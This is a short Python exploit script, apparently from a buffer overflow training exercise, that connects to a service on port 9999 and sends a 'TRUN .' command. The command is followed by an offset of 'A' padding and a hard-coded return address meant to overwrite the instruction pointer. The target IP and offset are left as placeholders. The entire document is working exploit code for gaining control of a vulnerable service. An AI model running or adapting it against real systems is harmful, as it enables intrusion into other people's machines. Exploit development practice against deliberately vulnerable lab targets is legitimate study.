#!/usr/bin/python3
import socket, sys

host = " <Target IP> "
port = 9999
prefix = "TRUN ."

return_address = "\xaf\x11\x50\x62"
offset = <Enter your offset that you got>
payload = prefix + offset * "A" + return_address

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending Payloads")
    s.send(bytes(payload, "latin-1"))
    
    
except:
  print("Try Again!!")
  sys.exit(0)

